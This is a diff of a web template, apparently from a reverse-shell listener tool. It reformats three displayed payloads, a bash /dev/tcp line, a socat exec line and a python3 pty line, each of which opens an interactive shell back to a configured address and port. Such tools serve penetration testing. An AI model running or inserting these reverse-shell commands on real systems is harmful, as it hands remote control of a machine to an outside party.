@@ -129,19 +129,13 @@
         for more.
 
         <h2>bash</h2>
-        <pre>
-          /bin/bash -li >& /dev/tcp/{config.address}:{config.port} 0>&1
-        </pre>
+        <pre>/bin/bash -li >& /dev/tcp/{config.address}:{config.port} 0>&1</pre>
 
         <h2>socat</h2>
-        <pre>
-            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{config.address}:{config.port}
-        </pre>
+        <pre>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{config.address}:{config.port}</pre>
 
         <h2>python 3</h2>
-        <pre>
-          python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{config.address}",{config.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
-        </pre>
+        <pre>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{config.address}",{config.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'</pre>
       </div>
     {/if}
     {#if showTerminal}
